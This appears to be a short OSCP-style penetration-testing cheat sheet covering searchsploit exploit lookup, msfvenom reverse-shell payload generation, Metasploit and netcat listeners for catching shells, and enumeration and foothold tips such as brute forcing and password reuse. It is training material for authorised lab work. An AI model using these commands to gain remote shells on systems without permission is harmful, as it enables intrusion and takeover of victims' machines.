# How to hack without Metasploit

## 1 . Finding Exploits

#### Search for exploits

```
searchsploit keyword1 keyword2 keyword3 ...
```

#### Copy exploit

```
searchsploit -m [exploit database id]
```

If searchsploit fails to find any juicy exploits, try Google. If Google fails, well, there’s probably not a public exploit. TRY HARDER!

It may be exploitable with:

* Public POC (github, blog etc.)
* Need to understand the code and POC
* Try with your own
* Bruteforcing
* Clear text password in files (need detail enumeration)

## 2 . Customising Payloads

To open a Meterpreter session or a reverse shell so that you can take control of the victim box&#x20;

#### MsfVenom

```
msfvenom -p [payload] -f [format] LHOST=[your ip] LPORT=[your listener port]
```

* staged - `windows/shell/reverse_tcp`
* unstaged - `windows/shell_reverse_tcp`

Other option

* `-e` to choose an encoder
* `-b` allows you to set bad characters

List all payloads for msfvenom -&#x20;

```
msfvenom --list payloads
```

## 3 .  Privilege Escalation

* To - be - filled
* To - be - filled

## 4 . Catching reverse shells

Metasploit multi/handler listener

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

Netcat listener (unstaged payload)

```
root@kali:~# nc -nvlp 80
nc: listening on :: 80 ...
nc: listening on 0.0.0.0 80 ...
```

## 5 .  Enumerate more (adithyanak way)

**Enumerate more means:**

* Scan ports, scan all the ports, scan using different scanning techniques,
* brute force web dirs, brute force web dirs using different wordlist and tools
* check for file permissions, check for registry entries, check for writable folders, check for privileged processes and services, check for interesting files,
* look for a suitable exploit using searchsploit , search google for valuable information, etc.
* webserver version, web app version, CMS version, plugin versions‌

**Tip for Foothold :**&#x20;

* Password reuse
* The default password of the application / CMS
* Guess the file location incase of LFI with username
* username from any notes inside the machine might be useful for Bruteforce
* Try harder doesn’t mean you have to try the same exploit with 200x thread count or with an angry face. Go, enumerate harder.

Refer : [<mark style="color:orange;">https://blog.adithyanak.com/oscp-preparation-guide/enumeration</mark>](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)
